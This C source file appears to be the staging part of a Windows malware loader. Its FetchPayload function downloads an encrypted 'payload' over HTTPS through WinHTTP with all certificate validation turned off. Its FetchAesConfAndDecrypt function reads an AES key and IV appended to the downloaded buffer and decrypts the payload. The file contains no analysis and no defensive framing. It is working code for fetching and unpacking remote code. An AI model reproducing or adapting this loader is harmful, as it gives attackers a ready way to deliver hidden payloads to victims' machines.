#include <windows.h>
#include <winhttp.h>
#include <stdio.h>
#include "Structs.h"
#include "Common.h"
//#include "debug.h"
#include "CtAes.h"
#include <winhttp.h>

#pragma comment(lib, "winhttp.lib")

#define CUSTOM_HEADER L"X-Application-ID: xxxx"



void* custom_realloc(void* ptr, size_t size) {
    if (ptr == NULL) {
        return LocalAlloc(LPTR, size);
    }
    if (size == 0) {
        LocalFree(ptr);
        return NULL;
    }
    void* new_ptr = LocalReAlloc(ptr, size, LMEM_MOVEABLE);
    if (new_ptr == NULL) {
        //printf("Memory allocation failed for size: %zu\n", size);
        return NULL;
    }
    return new_ptr;
}


BYTE* FetchPayload(LPCWSTR baseAddress, LPCWSTR filename, PBYTE* ppResourceBuffer, SIZE_T* pSize) {
    HINTERNET hSession = WinHttpOpen(
        NULL,
        WINHTTP_ACCESS_TYPE_AUTOMATIC_PROXY,    // proxy aware
        WINHTTP_NO_PROXY_NAME,
        WINHTTP_NO_PROXY_BYPASS,
        0);                                     // No additional flags needed here

    if (!hSession) {
        //PrintLastError("WinHttpOpen");
        return NULL;
    }

    // Create session for target
    HINTERNET hConnect = WinHttpConnect(
        hSession,
        baseAddress,
        INTERNET_DEFAULT_HTTPS_PORT,            // PORT 443
        0);

    if (!hConnect) {
        //PrintLastError("WinHttpConnect");
        WinHttpCloseHandle(hSession);
        return NULL;
    }

    // Create request handle
    HINTERNET hRequest = WinHttpOpenRequest(
        hConnect,
        L"GET",
        filename,
        NULL,
        WINHTTP_NO_REFERER,
        WINHTTP_DEFAULT_ACCEPT_TYPES,
        WINHTTP_FLAG_SECURE);                   // SSL

    if (!hRequest) {
        //PrintLastError("WinHttpOpenRequest");
        WinHttpCloseHandle(hConnect);
        WinHttpCloseHandle(hSession);
        return NULL;
    }

    // Ignore SSL certificate errors
    DWORD dwFlags = SECURITY_FLAG_IGNORE_UNKNOWN_CA |
        SECURITY_FLAG_IGNORE_CERT_WRONG_USAGE |
        SECURITY_FLAG_IGNORE_CERT_CN_INVALID |
        SECURITY_FLAG_IGNORE_CERT_DATE_INVALID;
    if (!WinHttpSetOption(hRequest, WINHTTP_OPTION_SECURITY_FLAGS, &dwFlags, sizeof(dwFlags))) {
        //PrintLastError("WinHttpSetOption");
        goto _end;
    }

    // Send the request
    BOOL bRequestSent = WinHttpSendRequest(
        hRequest,
        CUSTOM_HEADER,
        -1L,
        WINHTTP_NO_REQUEST_DATA,
        0,
        0,
        0);

    if (!bRequestSent) {
        //PrintLastError("WinHttpSendRequest");
        goto _end;
    }

    // Receive response
    BOOL bResponseReceived = WinHttpReceiveResponse(hRequest, NULL);
    if (!bResponseReceived) {
        //PrintLastError("WinHttpReceiveResponse");
        goto _end;
    }

    // Read the data
    BYTE* buffer = NULL;
    SIZE_T totalSize = 0;
    DWORD bytesRead = 0;

    do {
        BYTE temp[4096] = { 0 };
        BOOL bRead = WinHttpReadData(hRequest, temp, sizeof(temp), &bytesRead);
        if (!bRead) {
            //PrintLastError("WinHttpReadData");
            break;
        }

        if (bytesRead > 0) {
            BYTE* newBuffer = (BYTE*)custom_realloc(buffer, totalSize + bytesRead);
            if (!newBuffer) {
               // printf("Memory allocation failed\n");
                LocalFree(buffer);
                goto _end;
            }

            buffer = newBuffer;
            Memcpy(buffer + totalSize, temp, bytesRead);
            totalSize += bytesRead;
        }
    } while (bytesRead > 0);

    WinHttpCloseHandle(hRequest);
    WinHttpCloseHandle(hConnect);
    WinHttpCloseHandle(hSession);

    *pSize = totalSize;
    *ppResourceBuffer = buffer;


    return buffer;

_end:
    WinHttpCloseHandle(hRequest);
    WinHttpCloseHandle(hConnect);
    WinHttpCloseHandle(hSession);
    return NULL;
    }

#define		PAGE_SIZE					4096
#define		SET_TO_MULTIPLE_OF_4096(X)	( ((X) + 4095) & (~4095) )

BOOL FetchAesConfAndDecrypt(IN PBYTE pPayloadBuffer, IN OUT SIZE_T* sPayloadSize, OUT PBYTE* ppDecryptedPayload) {

	BOOL			bResult = FALSE;
	AES256_CBC_ctx	CtAesCtx = { 0 };
	BYTE			pAesKey[KEY_SIZE] = { 0 };
	BYTE			pAesIv[IV_SIZE] = { 0 };
	ULONG_PTR		uAesKeyPtr = NULL,
		uAesIvPtr = NULL;

	uAesKeyPtr = ((pPayloadBuffer + *sPayloadSize) - (KEY_SIZE + IV_SIZE));
	uAesIvPtr = ((pPayloadBuffer + *sPayloadSize) - IV_SIZE);

	Memcpy(pAesKey, uAesKeyPtr, KEY_SIZE);
	Memcpy(pAesIv, uAesIvPtr, IV_SIZE);

	// Updating the payload size
	*sPayloadSize = *sPayloadSize - (KEY_SIZE + IV_SIZE);

	// Decrypting
	AES256_CBC_init(&CtAesCtx, pAesKey, pAesIv);
	if (!AES256_CBC_decrypt(&CtAesCtx, pPayloadBuffer, *sPayloadSize, ppDecryptedPayload))
		goto _FUNC_CLEANUP;

	bResult = TRUE;

_FUNC_CLEANUP:
	HeapFree(GetProcessHeap(), 0x00, pPayloadBuffer);	// Free allocated heap in 'GetResourcePayload' function
	return bResult;
}
